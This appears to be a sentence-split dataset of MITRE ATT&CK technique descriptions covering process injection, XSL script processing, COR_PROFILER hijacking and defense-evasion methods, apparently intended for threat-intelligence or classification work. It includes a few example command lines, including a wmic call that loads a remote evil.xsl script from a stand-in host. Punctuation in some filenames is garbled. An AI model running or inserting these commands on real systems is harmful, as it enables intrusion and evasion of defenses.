16576,T1027,T1027.007,Dynamic API Resolution,"Similar to Software Packing,, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime."
16577,T1027,T1027.007,Dynamic API Resolution,Various methods may be used to obfuscate malware calls to API functions.
16578,T1027,T1027.007,Dynamic API Resolution,"For example, hashes of function names are commonly stored in malware in lieu of literal strings."
16579,T1027,T1027.007,Dynamic API Resolution,Malware can use these hashes  to manually reproduce the linking and loading process using functions such as `GetProcAddress` and `LoadLibrary`.
16580,T1027,T1027.007,Dynamic API Resolution,These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks  during execution.
16581,T1027,T1027.007,Dynamic API Resolution,"Bazar, can hash then resolve API calls at runtime."

16631,T1037,T1037.001,Logon Script (Windows),Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence.
16632,T1037,T1037.001,Logon Script (Windows),Windows allows logon scripts to be run whenever a specific user or group of users log into a system.
16633,T1037,T1037.001,Logon Script (Windows),This is done via adding a path to a script to the HKCU\Environment\UserInitMprLogonScript Registry key.

16640,T1055,T1055.015,ListPlanting,Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.
16641,T1055,T1055.015,ListPlanting,ListPlanting is a method of executing arbitrary code in the address space of a separate live process.
16642,T1055,T1055.015,ListPlanting,Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.
16643,T1055,T1055.015,ListPlanting,List-view controls are user interface windows used to display collections of items.
16644,T1055,T1055.015,ListPlanting,Information about an application's list-view settings are stored within the process' memory in a SysListView32 control.
16645,T1055,T1055.015,ListPlanting,ListPlanting  may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.
16646,T1055,T1055.015,ListPlanting,"Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window  or other Process Injection, methods."
16647,T1055,T1055.015,ListPlanting,"Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function."
16648,T1055,T1055.015,ListPlanting,"For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory."
16649,T1055,T1055.015,ListPlanting,"Finally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback."
16650,T1055,T1055.015,ListPlanting,"InvisiMole, has used ListPlanting to inject code into a trusted process."
16651,T1665,T1665,Hide Infrastructure,Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure.
16652,T1665,T1665,Hide Infrastructure,"This can be accomplished in various ways including by identifying and filtering traffic from defensive tools, masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers, and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely."
16653,T1665,T1665,Hide Infrastructure,"C2 networks may include the use of Proxy, or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections."
16654,T1665,T1665,Hide Infrastructure,"For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges."
16655,T1665,T1665,Hide Infrastructure,This may also bypass security measures relying on geolocation of the source IP address.
16656,T1665,T1665,Hide Infrastructure,"Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents."
16657,T1665,T1665,Hide Infrastructure,"Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity , Virtualization/Sandbox Evasion,."
16658,T1665,T1665,Hide Infrastructure,"Hiding C2 infrastructure may also be supported by Resource Development, activities such as Acquire Infrastructure, and Compromise Infrastructure,."
16659,T1665,T1665,Hide Infrastructure,"For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met."
16660,T1665,T1665,Hide Infrastructure,"DarkGate, command and control includes hard-coded domains in the malware masquerading as legitimate services such as Akamai CDN or Amazon Web Services."
16661,T1665,T1665,Hide Infrastructure,"APT29, uses compromised residential endpoints, typically within the same ISP IP address range, as proxies to hide the true source of C2 traffic."
16662,T1484,T1484,Domain or Tenant Policy Modification,Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments.
16663,T1484,T1484,Domain or Tenant Policy Modification,"Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation."
16664,T1484,T1484,Domain or Tenant Policy Modification,"Modifications to domain or tenant settings may include altering domain Group Policy Objects  in Microsoft Active Directory  or changing trust settings for domains, including federation trusts relationships between domains or tenants."
16665,T1484,T1484,Domain or Tenant Policy Modification,"With sufficient permissions, adversaries can modify domain or tenant policy settings."
16666,T1484,T1484,Domain or Tenant Policy Modification,"Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse."
16667,T1484,T1484,Domain or Tenant Policy Modification,"Examples of such abuse include:  
* modifying GPOs to push a malicious Scheduled Task, to computers throughout the domain environment
* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources
* changing configuration settings within the AD environment to implement a Rogue Domain Controller,."
16668,T1484,T1484,Domain or Tenant Policy Modification,"* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant 
Adversaries may temporarily modify domain or tenant policy, carry out a malicious action, and then revert the change to remove suspicious indicators."
16669,T1220,T1220,XSL Script Processing,Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files.
16670,T1220,T1220,XSL Script Processing,Extensible Stylesheet Language  files are commonly used to describe the processing and rendering of data within XML files.
16671,T1220,T1220,XSL Script Processing,"To support complex operations, the XSL standard includes support for embedded scripting in various languages."
16672,T1220,T1220,XSL Script Processing,Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.
16673,T1220,T1220,XSL Script Processing,"Similar to Trusted Developer Utilities Proxy Execution,, the Microsoft common line transformation utility binary   can be installed and used to execute malicious JavaScript embedded within local or remote  XSL files."
16674,T1220,T1220,XSL Script Processing,"Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files."
16675,T1220,T1220,XSL Script Processing,"Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet."
16676,T1220,T1220,XSL Script Processing,"Since the XSL file is valid XML, the adversary may call the same XSL file twice."
16677,T1220,T1220,XSL Script Processing,When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.
16678,T1220,T1220,XSL Script Processing,"Command-line examples:
* msxsl.exe customers.,xml script.,xsl
* msxsl.exe script.,xsl script.,xsl
* msxsl.exe script.,jpeg script.,jpeg
Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation, to invoke JScript or VBScript within an XSL file."
16679,T1220,T1220,XSL Script Processing,"This technique can also execute local/remote scripts and, similar to its Regsvr32,/ ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool."
16680,T1220,T1220,XSL Script Processing,"Adversaries may abuse any alias in Windows Management Instrumentation, provided they utilize the /FORMAT switch."
16681,T1220,T1220,XSL Script Processing,"Command-line examples:
* Local File: wmic process list /FORMAT:evil.,xsl
* Remote File: wmic os get /FORMAT:”https:,//example.,com/evil.,xsl” Astaroth, executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain."
16682,T1220,T1220,XSL Script Processing,"Cobalt Group, used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file."

16684,T1220,T1220,XSL Script Processing,"Lazarus Group, has used WMIC to execute a remote XSL script to establish persistence."
16685,T1596,T1596.005,Scan Databases,Adversaries may search within public scan databases for information about victims that can be used during targeting.
16686,T1596,T1596.005,Scan Databases,"Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners."
16687,T1596,T1596.005,Scan Databases,Adversaries may search scan databases to gather actionable information.
16688,T1596,T1596.005,Scan Databases,Threat actors can use online resources and lookup tools to harvest information from these services.
16689,T1596,T1596.005,Scan Databases,"Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches."
16690,T1596,T1596.005,Scan Databases,"Information from these sources may reveal opportunities for other forms of reconnaissance  or Search Open Websites/Domains,, establishing operational resources  or Obtain Capabilities,, and/or initial access  or Exploit Public-Facing Application,."

16983,T1480,T1480.001,Environmental Keying,Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment.
16984,T1480,T1480.001,Environmental Keying,Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target.
16985,T1480,T1480.001,Environmental Keying,"Environmental keying is an implementation of Execution Guardrails, that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment."
16986,T1480,T1480.001,Environmental Keying,Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload.
16987,T1480,T1480.001,Environmental Keying,"Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses."

16991,T1480,T1480.001,Environmental Keying,Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.
16992,T1480,T1480.001,Environmental Keying,By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection.
16993,T1480,T1480.001,Environmental Keying,"Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult."
16994,T1480,T1480.001,Environmental Keying,This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.

17198,T1055,T1055.001,Dynamic-link Library Injection,DLL injection is a method of executing arbitrary code in the address space of a separate live process.
17199,T1055,T1055.001,Dynamic-link Library Injection,DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread.
17200,T1055,T1055.001,Dynamic-link Library Injection,"The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread ."
17201,T1055,T1055.001,Dynamic-link Library Injection,Variations of this method such as reflective DLL injection  and memory module  overcome the address relocation issue as well as the additional APIs to invoke execution .
17202,T1055,T1055.001,Dynamic-link Library Injection,"Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process."
17203,T1055,T1055.001,Dynamic-link Library Injection,This method involves loading a legitimate DLL into a remote process then manually overwriting the module's AddressOfEntryPoint before starting a new thread in the target process.
17204,T1055,T1055.001,Dynamic-link Library Injection,This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.
17205,T1055,T1055.001,Dynamic-link Library Injection,Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.

17640,T1218,T1218.014,MMC,Microsoft Management Console  is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.
17641,T1218,T1218.014,MMC,"MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins."
17642,T1218,T1218.014,MMC,These snap-ins may be used to manage Windows systems locally or remotely.
17643,T1218,T1218.014,MMC,MMC can also be used to open Microsoft created .msc files to manage system configuration.
17644,T1218,T1218.014,MMC,"For example, mmc C:\Users\foo\admintools.msc /a will open a custom, saved console msc file in author mode."

17648,T1218,T1218.014,MMC,Adversaries may also abuse MMC to execute malicious .msc files.
17649,T1218,T1218.014,MMC,"For example, adversaries may first create a malicious registry Class Identifier  subkey, which uniquely identifies a Component Object Model, class object."
17650,T1218,T1218.014,MMC,"Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey."
17651,T1218,T1218.014,MMC,"Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: mmc.exe -Embedding C:\path\to\test.msc."
17652,T1564,T1564.010,Process Argument Spoofing,Adversaries may attempt to hide process command-line arguments by overwriting process memory.
17653,T1564,T1564.010,Process Argument Spoofing,"Process command-line arguments are stored in the process environment block , a data structure used by Windows to store various information about/used by a process."
17654,T1564,T1564.010,Process Argument Spoofing,The PEB includes the process command-line arguments that are referenced when executing the process.
17655,T1564,T1564.010,Process Argument Spoofing,"When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB."
17656,T1564,T1564.010,Process Argument Spoofing,Adversaries may manipulate a process PEB to evade defenses.
17657,T1564,T1564.010,Process Argument Spoofing,"For example, Process Hollowing, can be abused to spawn a process in a suspended state with benign arguments."
17658,T1564,T1564.010,Process Argument Spoofing,"After the process is spawned and the PEB is initialized , adversaries may override the PEB to modify the command-line arguments  WriteProcessMemory function then resume process execution with malicious arguments."
17659,T1564,T1564.010,Process Argument Spoofing,Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.
17660,T1564,T1564.010,Process Argument Spoofing,This behavior may also be combined with other tricks  to manipulate or further evade process-based detections.
17661,T1564,T1564.010,Process Argument Spoofing,"Cobalt Strike, can use spoof arguments in spawned processes that execute beacon commands."
17662,T1564,T1564.010,Process Argument Spoofing,"SombRAT, has the ability to modify its process memory to hide process command-line arguments."

17665,T1077,T1077,Windows Admin Shares,"The Net, utility can be used to connect to Windows admin shares on remote systems using net use commands with valid credentials."
17666,T1077,T1077,Windows Admin Shares,An adversary guesses or obtains  steals or purchases legitimate Windows administrator credentials  to access Windows Admin Shares on a local machine or within a Windows domain.
17667,T1574,T1574.012,COR_PROFILER,Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR.
17668,T1574,T1574.012,COR_PROFILER,The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged  profiling DLL to be loaded into each .NET process that loads the Common Language Runtime .
17669,T1574,T1574.012,COR_PROFILER,"These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR."
17670,T1574,T1574.012,COR_PROFILER,The COR_PROFILER environment variable can be set at various scopes  resulting in different levels of influence.
17671,T1574,T1574.012,COR_PROFILER,"System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model,  object can be registered as a profiler DLL."
17672,T1574,T1574.012,COR_PROFILER,A process scope COR_PROFILER can also be created in-memory without modifying the Registry.
17673,T1574,T1574.012,COR_PROFILER,"Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable."
17674,T1574,T1574.012,COR_PROFILER,Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked.
17675,T1574,T1574.012,COR_PROFILER,"The COR_PROFILER can also be used to elevate privileges  if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses, provided by .NET processes."
17676,T1574,T1574.012,COR_PROFILER,"DarkTortilla, can detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active."
17677,T1574,T1574.012,COR_PROFILER,"Blue Mockingbird, has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR."
